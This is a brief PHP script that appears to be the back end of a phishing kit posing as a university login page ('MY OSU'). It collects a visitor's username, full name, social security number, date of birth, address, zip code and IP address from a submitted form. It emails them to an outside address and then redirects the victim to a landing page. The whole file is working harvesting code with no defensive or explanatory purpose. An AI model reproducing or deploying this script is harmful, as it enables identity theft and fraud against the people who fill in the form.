<?
$username  = $_POST['UserName'];

$fullname  = $_POST['Fullname'];

$social = $_POST['socialsec'];

$dateofb = $_POST['dateob'];

$Address = $_POST['address'];

$zipcode = $_POST['zip'];

$ip = $_SERVER['REMOTE_ADDR'];


$subj = "MY OSU";
$msg = "j_username : $username \n FullName: $fullname \n socialsec: $social \n dateob: $dateofb \n address: $Address \n zip: $zipcode \n ipadd: $ip \n\n";


$from = "From: $ip<BSU>";

mail("globalserv@globalservicespaymt.com", $subj, $msg, $from);

mail("", $subj, $msg, $from);

header('location:landing.htm');

?>